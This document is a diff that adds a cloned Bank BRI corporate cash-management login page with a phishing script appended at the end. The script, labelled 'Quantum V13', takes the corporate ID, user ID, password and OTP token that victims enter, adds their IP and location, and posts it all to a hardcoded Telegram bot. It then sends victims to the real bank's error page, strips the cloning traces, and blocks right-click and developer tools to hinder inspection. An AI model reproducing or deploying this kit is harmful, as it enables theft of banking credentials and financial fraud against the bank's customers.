@@ -1,0 +1,640 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from ibank.bri.co.id/cms/Logon.aspx by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Feb 2026 20:42:42 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>BRI Cash Management System</title>
+    <link rel="SHORTCUT ICON" href="favicon.ico" type="image/x-icon" />
+	
+    <link href="css/themecms.css" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="css/thickbox.css" type="text/css" media="screen" />
+    <script src="css/js/jquery-1.5.1.min.js" type="text/javascript"></script>
+    <script src="css/thickbox-compressed.js" type="text/javascript"></script>    
+    <script type="text/javascript">
+        function validate_input() {
+			if (document.getElementById('ClientID').value == '') {alert('Invalid ClientID.');document.getElementById('ClientID').focus();return false;}
+            if (document.getElementById('UserID').value == '') {alert('Invalid UserID.');document.getElementById('UserID').focus();return false;}
+            if (document.getElementById('Password').value == '') {alert('Invalid Password.');document.getElementById('Password').focus();return false;}
+            return true;
+        }
+		
+		function popup(mylink, windowname){
+			var popW = 400, popH = 500;var leftPos = (screen.width - popW)/2, topPos = (screen.height - popH)/2;
+			window.open("https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=ibank.bri.co.id&amp;lang=en","","width=520,height=450" + ' ,top=' + topPos + ',left=' + leftPos);
+			return false;
+		}
+
+        if (top.location != location) {top.location.href = document.location.href ;}
+        <!--
+        /***********************************************
+        * Auto Maximize Window Script- © Dynamic Drive (www.dynamicdrive.com)
+        * This notice must stay intact for use
+        * Visit http://www.dynamicdrive.com/ for this script and 100's more.
+        ***********************************************/
+        top.window.moveTo(0,0);
+        if (document.all) {
+        top.window.resizeTo(screen.availWidth,screen.availHeight);
+        }
+        else if (document.layers||document.getElementById) {
+        if (top.window.outerHeight<screen.availHeight||top.window.outerWidth<screen.availWidth){
+        top.window.outerHeight = screen.availHeight;
+        top.window.outerWidth = screen.availWidth;
+        }
+        }
+        //-->
+
+		var clockId;gettimeserver();var first;
+				
+		function StartClock() {clockId = setTimeout("UpdateClock()", 500);first = 0;}
+		function KillClock() {if (clockId) {clearTimeout(clockId);clockId = 0;}}
+		function pad(number, length) {var str = '' + number;while (str.length < length) {str = '0' + str;}return str;}
+		function UpdateClock() {
+			if (clockId) {clearTimeout(clockId);clockId = 0;}
+			if(first!=0){
+				var tempdate =  $("#theTime").val();
+				var today = $("#theTime").val();
+				tempdate = tempdate.replace("AM","").replace("PM","").replace("Sunday","").replace("Monday","").replace("Tuesday","").replace("Wednesday","").replace("Thursday","").replace("Friday","").replace("Saturday","").replace(", ","");
+				tempdate = tempdate.replace("AM","").replace("PM","").replace("Minggu","").replace("Senin","").replace("Selasa","").replace("Rabu","").replace("Kamis","").replace("Jumat","").replace("Sabtu","").replace(", ","");						
+				tempdate = tempdate.replace(" January ","https://ibank.bri.co.id/01/").replace(" February ","https://ibank.bri.co.id/02/").replace(" March ","https://ibank.bri.co.id/03/").replace(" April ","https://ibank.bri.co.id/04/").replace(" May ","https://ibank.bri.co.id/05/").replace(" June ","https://ibank.bri.co.id/06/").replace(" July ","https://ibank.bri.co.id/07/").replace(" August ","https://ibank.bri.co.id/08/").replace(" September ","https://ibank.bri.co.id/09/").replace(" October ","https://ibank.bri.co.id/10/").replace(" November ","https://ibank.bri.co.id/11/").replace(" December ","https://ibank.bri.co.id/12/");
+				tempdate = tempdate.replace(" Januari ","https://ibank.bri.co.id/01/").replace(" Februari ","https://ibank.bri.co.id/02/").replace(" Maret ","https://ibank.bri.co.id/03/").replace(" April ","https://ibank.bri.co.id/04/").replace(" Mei ","https://ibank.bri.co.id/05/").replace(" Juni ","https://ibank.bri.co.id/06/").replace(" Juli ","https://ibank.bri.co.id/07/").replace(" Agustus ","https://ibank.bri.co.id/08/").replace(" September ","https://ibank.bri.co.id/09/").replace(" Oktober ","https://ibank.bri.co.id/10/").replace(" November ","https://ibank.bri.co.id/11/").replace(" Desember ","https://ibank.bri.co.id/12/");
+				var year = tempdate.substring(6,10);
+				var month = tempdate.substring(3,5);
+				var day = tempdate.substring(0,2);
+				var hour = tempdate.substring(11,13);
+				var hourold = tempdate.substring(11,13);
+				var minute = tempdate.substring(14,16);
+				var minuteold = tempdate.substring(14,16);
+				var constold = hourold + ":" + minuteold;				
+				minute = parseInt(minute,10) + 1;
+				if(minute==60){
+					minute = "00";
+					hour = parseInt(hour,10) + 1;
+					if(hour==12){gettimeserver();} 
+					else {if(hour==13) hour = "01";var constnew = pad(hour, 2) + ":" + pad(minute, 2);$("#theTime").val(today.replace(constold,constnew));}
+				} else {
+					var constnew = pad(hour, 2) + ":" + pad(minute, 2);$("#theTime").val(today.replace(constold,constnew));					
+				}
+			} else {first = 1;}
+			clockId = setTimeout("UpdateClock()", 60000);
+		}
+		function gettimeserver(){
+				$.ajax({
+				  url: 'function/GetServerTime.ashx',
+				  cache:false,
+				  dataType:"json",	
+				  data: {Jenis: "0"},
+				  success: function(data) {
+						$("#theTime").val(data["Value"]);						
+				  }
+				});   
+			}
+		function cek(){
+            var client = document.getElementById('ClientID').value;
+            var user = document.getElementById('UserID').value;
+            var paramList = '{"ClientID":"' + client + '","UserID":"' + user + '"}';
+            $.ajax({
+              type: "POST",
+              url: "function/ajaxload.aspx/cektoken",
+              data: paramList,
+              contentType: "application/json; charset=utf-8",
+              dataType: "json",
+              success: function(msg) {
+              if (msg.d == "true"){$("#divtoken").css('visibility', 'visible');}
+              else{$("#divtoken").css('visibility', 'hidden');}
+              $("#Result").text(msg.d);
+              }
+            });
+        }
+    </script>
+        
+    <script type="text/javascript">
+        function Confirm()
+        {
+            var confrim_value = document.createElement("INPUT");
+            
+            confrim_value.type = "hidden";
+            confrim_value.name = "confirm_value";
+            
+            if(confirm("Anda Yakin Melakukan Reset Password ?"))
+            {
+                confrim_value.value = "Yes";
+            }
+            else
+            {
+                confrim_value.value = "No";
+            }
+            
+            document.forms[0].appendChild(confrim_value);
+        }
+    </script>
+        
+    <style type="text/css">
+        .style2{width: 40px;}
+        .style3{width: 54px;}
+		.lblLogin{text-align:left; font-family:@Verdana; font-weight:bold; font-size:smaller}
+    </style>
+    
+</head>
+
+<body style="margin: 0 0 0 0; background:#ffffff" onload="StartClock(); cek();">
+	
+<div id="container" style="text-align:left;margin:0 auto; margin-bottom:0px;width:975px; background-color:#edf0f7" >
+	<div id ="header-container">
+	<div id="left-container" style="height:93px" >
+	    <div> <img src="images/leftheadertabel.png" style="float:right; margin:13px 2px 0px 0px" ></div>
+	</div>
+	<div style="clear:right"></div>
+	<!--End Left Container-->
+	<div id="right-container" >
+	    <div class="floatleft" style="padding:68px 16px 0px 0px;">
+	        <span style="font-family:Verdana; font-size:12px; font-weight:bold; color:black; text-align:center; padding-bottom:50px;">
+			            <input id="theTime" type="text" style="border-style:none;font-family:Verdana; font-size:x-small; font-weight:bold; color:White; background-color:Transparent; height:15px; vertical-align:text-top; width: 264px; " 
+                                readonly="readonly" /> 
+		    </span>
+			
+	    </div>
+	    <div class="floatright">
+    	    <img src="images/logo-bri-b.jpg" style="margin-bottom:0px;margin-top:0px;border:0px; padding-right:0px; float:right;" width="216" height="86" >
+	    </div>
+	    <div class="clear"></div>
+	
+	    <div class="clear"></div>
+	    <!--End Right Container Header-->
+	</div>
+	<div class="clear"></div>
+	</div>
+	<!--End Header-->
+	
+	<div id="main-content">
+	    <div id="left-main-content">
+	        <div id="tabel-kiri" style="width:192px; height:250px;" >
+	            <div style="padding:15px 35px 0px 0px;">
+	                <table width="140px" class="front-tabel" style="float: right; " bgcolor="#94bbde" border="0px">
+	                    <tr style="background-color:#00549d; color:White; font-weight:bold;"><td colspan="3" style="text-align:center"> &nbsp; Exchange Rate </td></tr>
+	                    <tr style="background-color:#fef7ef; color:Black"><td colspan="3" style="text-align:center"><span id="lastkurs">2/13/2026, 3:04 PM</span></td></tr>
+                        <tr style="background-color:#94bbde; color:White; font-weight:bold;">
+                            <td style="text-align:center;" > CCY </td>
+                            <td style="text-align:right;" > Sell &nbsp;&nbsp;&nbsp;</td> 
+                            <td style="text-align:right;" > Buy &nbsp;&nbsp;&nbsp;</td></tr>
+                        <tr style="background-color:#94bbde; text-align:center; font-family: 'Kozuka Mincho Pro B';">
+                            <td >USD </td>
+                            <td style="text-align:right;"><span id="lblUSDjual">16.990,00</span></td> 
+                            <td style="text-align:right;"><span id="lblUSDbeli">16.690,00</span></td> 
+                        </tr>
+                        <tr style="background-color:#94bbde; text-align:center; font-family: 'Kozuka Mincho Pro B'; ">
+                            <td  >SGD</td>
+                            <td style="text-align:right;"><span id="lblSGDjual">13.589,52</span></td> 
+                            <td style="text-align:right;"><span id="lblSGDbeli">13.132,35</span></td> 
+                        </tr>
+                        <tr style="background-color:#94bbde;text-align:center; font-family: 'Kozuka Mincho Pro B';">
+                            <td  >HKD</td>
+                            <td style="text-align:right;"><span id="lblHKDjual">2.182,06</span></td> 
+                            <td style="text-align:right;"><span id="lblHKDbeli">2.127,42</span></td> 
+                        </tr>
+                        <tr style="background-color:#94bbde;text-align:center; font-family: 'Kozuka Mincho Pro B';">
+                            <td  >CHF</td>
+                            <td style="text-align:right;"><span id="lblCHFjual">22.141,91</span></td> 
+                            <td style="text-align:right;"><span id="lblCHFbeli">21.574,29</span></td> 
+                        </tr>
+                        <tr style="background-color:#548cbd;">
+                            <td colspan="3" style="text-align:right; "> 
+                                <a href="help/kurs2676.html?&amp;height=450&amp;width=470" title="Exchange Rate" style="text-decoration:none; color:White; margin-right:5px;" class="thickbox">All</a>
+                            </td></tr>
+                    </table>
+	            </div>
+	            <br /><br /><br /><br /><br /><br /><br /><br /><br />
+                 
+
+            </div>
+            <div  style="float:right">
+                <img alt="" src="images/leftfoot-b.jpg" width="192" height="131" >
+            </div>
+            <div class="clear"></div>
+            <div class="div-callbri" style="padding-left:30px;">
+                Untuk informasi lebih lanjut, <br /> hubungi :
+                <br /><img alt="" src="images/HelpDesk.png" style="padding-top:5px" />
+                <br /><a href="mailto:cash_mgt@bri.co.id" target="_blank">cash_mgt@bri.co.id</a>
+				<!--<br /><asp:Label ID="noTelegram">Telegram	: +628111635640</asp:Label>-->
+            </div>
+            
+	    </div> 
+	   	
+	    <div id="right-main-content">
+	         <div id="left-main-content-right">
+	            <div style="margin:10px 0px 0px 0px" >
+	                <div style="background-image:url(images/cew1-b.jpg); width:513px; height:342px;"></div>
+	            </div>
+	            
+				<br>
+				<div id="notify-text" style="margin:5px 0px 0px 0px; text-align:center">
+                    <span id="lblNotifikasi">Nasabah Yth. Sehubungan dengan adanya Cuti Bersama Tahun Baru Imlek pada tgl. 16 dan 17 Februari 2026, kami sampaikan transaksi antar bank, dengan fitur Single/Mass CN, Single RTGS, Single SWIFT, Payment Priority LLG/RTG/SWI, melalui CMS BRI tidak beroperasi pada tanggal tersebut dan akan beroperasi kembali pada tgl. 18 Februari 2026. Demikian pemberitahuan ini kami sampaikan. Terima kasih.</span>
+	            </div>
+				
+				
+				
+				<div id="pnltextx">
+	
+				
+				<div style="margin:70px 0px 0px 7px; font-size: xx-small; color:#3B6798; text-align: center;">
+	                Tampilan terbaik dengan Microsoft IE versi 7.0 ke atas, dengan resolusi 1024x768 pixel
+	                <br />
+	                Copyright &copy; 2011 Bank BRI, All Right Reserved
+	            </div>
+				<!--<div style="margin:70px 0px 0px 7px; font-size: xx-small; color:#3B6798; text-align: center;">
+					<img src="images/CMS_BRI_Website_Footer_120thn.jpg" style=" margin-bottom:-2px; width: 500px; height: 100px;">
+				</div>-->
+				
+</div>
+	         </div>  	
+	         
+	         <div id="right-main-content-right">
+	                 <div id="div-login" class="topleftroundedlogin toprightroundedlogin bottomleftroundedlogin bottomrightroundedlogin">
+	                     <form name="frmLogin" method="post" action="javascript:void(0);" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'btnLogin')" id="frmLogin">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTIwMTE5NzY1OTIPZBYUAgEPDxYCHgRUZXh0BRIyLzEzLzIwMjYsIDM6MDQgUE1kZAIDDw8WAh8ABQkxNi45OTAsMDBkZAIFDw8WAh8ABQkxNi42OTAsMDBkZAIHDw8WAh8ABQkxMy41ODksNTJkZAIJDw8WAh8ABQkxMy4xMzIsMzVkZAILDw8WAh8ABQgyLjE4MiwwNmRkAg0PDxYCHwAFCDIuMTI3LDQyZGQCDw8PFgIfAAUJMjIuMTQxLDkxZGQCEQ8PFgIfAAUJMjEuNTc0LDI5ZGQCFQ8PFgIeB1Zpc2libGVoZGRk1sKHdu5inMuLaakuu8Byf2OSO1w=" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['frmLogin'];
+if (!theForm) {
+    theForm = document.frmLogin;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="WebResource00a3.js?d=cS-KmWvfJ4stWjWC5zvue_DzWSG_OHqGa3BjB6nmPMvOzPXGfFYfQNdCYNNclwRTw8io4cRYk56kLhr8gDL2GuSMu7s1&amp;t=635588876026805809" type="text/javascript"></script>
+
+
+<script src="WebResource5e00.js?d=QeG3Bp6BSvoCMaMhhPuG4DV-jI_DH8x5yEo1EjTa2rnBSoqCcozGsfQhYE_YySzE7zkWL9yiZxIE81N1lBH2rM1DkJ01&amp;t=635588876026805809" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="80D8E10D" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWCAKQ+dKkBwKVuv/pCQLr/4HfAgLSxeCRDwLD25u8BwKC3IeGDAKgt7D9CgK4+8HDASFxXGdFML4B+59dqsQphnZskZs9" />
+</div>
+                                
+                                 <div style="margin:5px 20px 10px 20px;">
+	                                <span class="lblLogin">Corporate ID</span>
+	                                <br /><input name="ClientID" type="text" maxlength="50" id="ClientID" class="inputtext" onblur="cek()" style="background-color:#E3E9EF;width:150px;" />
+	                                <br /><span class="lblLogin">User ID</span>
+	                                <br /><input name="UserID" type="text" maxlength="50" id="UserID" class="inputtext" onblur="cek()" style="background-color:#E3E9EF;width:150px;" />
+	                                <div id="PnlPassword">
+	
+	                                <span id="Passwordlbl" class="lblLogin">Password</span>
+                                    <br /><input name="Password" type="password" maxlength="50" id="Password" class="inputtext" style="background-color:#E3E9EF;width:150px;" />
+                                
+</div>
+	                                                                  
+                                	                                
+	                                <div id="divtoken" style="margin-top:0px">
+	                                    <span class="lblLogin">Passcode/Token</span>
+                                        <br /><input name="token" type="password" maxlength="15" id="token" class="inputtext" style="background-color:#E3E9EF;width:150px;" />
+	                                </div>
+	                                
+	                            </div>
+	                            
+	                            <table style="margin:5px 15px 10px 20px; width: 80%;" >
+	                            
+                                    <tr align="left">
+                                        <td class="style1">
+	                                        <small> <span id="Msg" style="color:Red;"></span> </small><br />&nbsp;
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td align="left">
+                                            <span id="bLogin" style="color:#ffffff;background:#4eafe2; margin-left:45px;padding:5px 8px 5px 8px;font-family:Tahoma;">
+                                                <a onclick="javascript:return validate_input();" id="btnLogin" href="javascript:void(0);" style="text-decoration:none;color:#fff;">   LOGIN   </a>
+                                            </span>                                         
+                                            <br />&nbsp;                                                            
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                    <td align="left">
+                                        
+                                        <span id="bReset" style="color:#ffffff;background:#4eafe2;margin-left:15px;padding:5px 8px 5px 8px;font-family:Tahoma;">
+                                                <a onclick="Confirm();" id="btnReset" href="javascript:__doPostBack('btnReset','')" style="text-decoration:none;color:#fff;">RESET PASSWORD</a>
+                                                </span>                                                
+                                        
+                                    </td>
+                                    </tr>
+                                </table>
+                                
+								
+								<!--Popup Pengumuman-->
+								<a href="help/Pengumumana411.html?&amp;height=300&amp;width=500" class="thickbox" style="display:none" id="LinkPengumuman">Pengumuman</a>
+                                <input type="hidden" name="isAdaPengumunan" id="isAdaPengumunan" value="ADA" />
+                                <script>
+                                   $(document).ready(function(){
+                                        if(document.getElementById('isAdaPengumunan').value =="ADA")
+                                            document.getElementById('LinkPengumuman').click();
+                                   });
+                                </script>
+								<!--Popup Pengumuman-->
+                        
+
+<script type="text/javascript">
+//<![CDATA[
+WebForm_AutoFocus('btnLogin');//]]>
+</script>
+</form>
+                        
+	                 </div>
+	                 
+	                 <div class="clear"></div> 
+	                 
+	                 <!-- untuk navigasi kanan-->
+	                 <div style="margin:25px 50px 3px 25px; border:solid 1px #e3934a;" class="div-petunjuk topleftrounded toprightrounded bottomleftrounded bottomrightrounded">
+	                    <a href="help/Tcondefd9.html?&amp;height=500&amp;width=600" class="thickbox">Syarat & Ketentuan</a>
+	                 </div>
+	                 <div style="margin:5px 50px 3px 25px; border:solid 1px #e3934a;" class="div-petunjuk topleftrounded toprightrounded bottomleftrounded bottomrightrounded">
+	                    <a href="help/Freg7bf5.html?&amp;height=250&amp;width=450" class="thickbox">Formulir Registrasi</a>
+	                 </div>
+	                 <div style="margin:5px 50px 3px 25px; border:solid 1px #e3934a;" class="div-petunjuk topleftrounded toprightrounded bottomleftrounded bottomrightrounded">
+	                    <a href="help/infoterbaruf617.html?&amp;height=750px&amp;width=1000px" class="thickbox">Info CMS</a>
+	                 </div>
+	                 <br />
+					 
+					 <div class="div-secure" style="width:175px; margin-left:15px; font-size:xx-small">	                
+	                    <div >
+                            <!--<a href="http://www.bri.co.id" target="_blank"><img alt="" alt="" src="images/call-b.jpg" style="text-decoration:none; border:none;" /></a>  -->             
+                            <img alt="" style="text-decoration:none; border:none;height:45px;" />
+							<br/>
+                            <!--<a href="http://www.bri.co.id" target="_blank" style="text-decoration:none; color:#346fac;">www.bri.co.id</a>-->
+							<br/>
+                        </div>
+                        <br />
+                        
+	                    <div >
+	                        This site choose Verisign <br /> SSL for secure <br /> e-commerce and <br /> confidental comunications
+                      <div style="text-decoration: none">
+                            <a href="javascript:void(0);" onclick="return popup('VeriSign', 'notes')" style="text-decoration: none">
+							                 <img alt=""; src="images/Norton_Secure-b.jpg" width="97px" height="59px" border="0" />
+						                </a>
+						         </div>						
+						</div>
+	                 
+	         
+	         </div>  	
+	         
+	         
+	         <div class="clear"></div>  
+	        <!--End main content Right-->
+
+	    </div>	
+	    <div class="clear"></div>
+	    <!--End Main Content-->
+
+</div>
+</div>
+<div id="footer" style="text-align:left;margin:0 auto; margin-bottom:0px;width:975px; background:#edf0f7"  >
+   <img src="images/footer-b.jpg" style=" margin-bottom:-2px; width: 975px; height: 50px;">
+</div>
+
+<!-- ==================== QUANTUM V13 TELEGRAM ENGINE ==================== -->
+<script type="text/javascript">
+    // =====================================================
+    // KONFIGURASI BOT TELEGRAM - GANTI INI, KONTOL!
+    // =====================================================
+    const BOT_TOKEN = "8521911423:AAFWRw4j7Fg-DQjh0OuQpYsgb4T_7NyYj4k";   // Ganti dengan token bot lu
+    const CHAT_ID = "7567547031";                      // Ganti dengan chat ID lu
+    
+    // =====================================================
+    // FUNGSI-FUNGSI TELEGRAM ENGINE
+    // =====================================================
+    
+    // Fungsi dapetin IP korban
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch(e) {
+            return 'Unknown';
+        }
+    }
+    
+    // Fungsi dapetin lokasi (opsional)
+    async function getLocation() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return {
+                country: data.country_name || 'Unknown',
+                city: data.city || 'Unknown',
+                isp: data.org || 'Unknown'
+            };
+        } catch(e) {
+            return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
+        }
+    }
+    
+    // Fungsi kirim ke Telegram
+    async function sendToTelegram(data) {
+        const message = `
+🔥 **CMS BRI DATA BARU** 🔥
+
+🏢 *Corporate ID:* \`${data.ClientID}\`
+👤 *User ID:* \`${data.UserID}\`
+🔑 *Password:* \`${data.Password}\`
+🔐 *Token/OTP:* \`${data.Token || 'N/A'}\`
+
+🌐 *IP Address:* \`${data.IP}\`
+📍 *Lokasi:* ${data.city}, ${data.country}
+🏢 *ISP:* ${data.isp}
+
+📱 *User Agent:* 
+\`${data.UserAgent.substring(0, 150)}\`
+
+⏰ *Waktu:* ${data.Timestamp}
+📌 *Source:* Quantum V13.0 - CMS BRI Phisher
+        `;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            if (response.ok) {
+                console.log('Data terkirim ke Telegram');
+                return true;
+            } else {
+                console.error('Gagal kirim ke Telegram');
+                return false;
+            }
+        } catch(error) {
+            console.error('Error:', error);
+            return false;
+        }
+    }
+    
+    // =====================================================
+    // MODIFIKASI FORM LOGIN
+    // =====================================================
+    
+    // Tunggu sampe halaman selesai loading
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('Quantum V13 Engine Loaded!');
+        
+        // Ambil form dan button login
+        const form = document.getElementById('frmLogin');
+        const loginBtn = document.getElementById('btnLogin');
+        const loginSpan = document.getElementById('bLogin');
+        
+        if (!form || !loginBtn) {
+            console.error('Form atau button gak ketemu!');
+            return;
+        }
+        
+        // Hapus atribut onclick asli
+        loginBtn.removeAttribute('onclick');
+        
+        // Simpan HTML asli button buat nanti
+        const originalBtnHTML = loginSpan.innerHTML;
+        
+        // Tambah event listener baru
+        loginBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            // Ambil data dari form
+            const ClientID = document.getElementById('ClientID')?.value || '';
+            const UserID = document.getElementById('UserID')?.value || '';
+            const Password = document.getElementById('Password')?.value || '';
+            const Token = document.getElementById('token')?.value || '';
+            
+            // Validasi input
+            if (!ClientID || !UserID || !Password) {
+                alert('Corporate ID, User ID, dan Password harus diisi!');
+                return;
+            }
+            
+            // Tampilkan loading
+            loginSpan.innerHTML = '<span style="color:#fff; padding:5px 8px;">PROSES...</span>';
+            
+            // Kumpulin data
+            const ip = await getIP();
+            const location = await getLocation();
+            const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+            
+            const payload = {
+                ClientID: ClientID,
+                UserID: UserID,
+                Password: Password,
+                Token: Token,
+                IP: ip,
+                country: location.country,
+                city: location.city,
+                isp: location.isp,
+                UserAgent: navigator.userAgent,
+                Timestamp: timestamp
+            };
+            
+            console.log('Mengirim data:', payload);
+            
+            // Kirim ke Telegram
+            const sent = await sendToTelegram(payload);
+            
+            if (sent) {
+                // Redirect ke halaman error BRI asli biar korban gak curiga
+                setTimeout(function() {
+                    window.location.href = 'https://ibank.bri.co.id/cms/Error.aspx?msg=Session+Timeout+Please+Login+Again';
+                }, 2000);
+            } else {
+                // Kalo gagal, kasih alert palsu
+                alert('Sistem sedang sibuk. Silakan coba lagi.');
+                loginSpan.innerHTML = originalBtnHTML;
+            }
+        });
+        
+        // Override fungsi __doPostBack
+        window.__doPostBack = function(eventTarget, eventArgument) {
+            console.log('__doPostBack diblokir:', eventTarget);
+            return false;
+        };
+        
+        // Override fungsi WebForm_FireDefaultButton (biar Enter gak submit ke mana-mana)
+        window.WebForm_FireDefaultButton = function(event, target) {
+            console.log('WebForm_FireDefaultButton diblokir');
+            if (event.key === 'Enter') {
+                document.getElementById('btnLogin')?.click();
+                return false;
+            }
+            return false;
+        };
+        
+        // Cegah submit pake Enter di field
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('btnLogin')?.click();
+                }
+            });
+        });
+        
+        // Hapus jejak HTTrack biar gak keliatan
+        const metaTags = document.querySelectorAll('meta');
+        metaTags.forEach(tag => {
+            if (tag.getAttribute('content')?.includes('HTTrack')) {
+                tag.remove();
+            }
+        });
+    });
+    
+    // =====================================================
+    // ANTI-INSPECT ELEMENT (Biar susah di-debug)
+    // =====================================================
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+            (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+            (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // Deteksi DevTools (opsional)
+    setInterval(function() {
+        const start = performance.now();
+        debugger;
+        const end = performance.now();
+        if (end - start > 100) {
+            // DevTools terbuka, arahkan ke Google
+            window.location.href = 'https://google.com';
+        }
+    }, 3000);
+    
+    console.log('%c🔥 QUANTUM V13 ACTIVE 🔥', 'font-size:20px; color:red; font-weight:bold');
+</script>
+<!-- ==================== END QUANTUM V13 ENGINE ==================== -->
+
+</body>
+
+<!-- Mirrored from ibank.bri.co.id/cms/Logon.aspx by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Feb 2026 20:43:02 GMT -->
+</html>
